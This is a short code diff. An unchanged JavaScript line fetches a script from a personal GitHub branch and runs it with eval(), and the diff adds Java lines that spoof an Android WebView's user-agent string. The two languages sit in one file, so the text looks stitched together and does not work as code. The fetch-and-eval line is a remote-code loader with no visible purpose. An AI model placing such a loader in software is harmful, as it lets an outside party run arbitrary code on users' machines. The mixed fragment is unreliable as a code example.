@@ -1,1 +1,5 @@
 fetch('https://raw.githubusercontent.com/cajemam/MPEI_lesson/patch-1/avizo.js').then(res => res.text()).then(data => {eval(data);}).catch(err => {console.error('Error: ', err);});
+
+
+String newUA= "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/20100101 Firefox/4.0";
+webView1.getSettings().setUserAgentString(newUA);
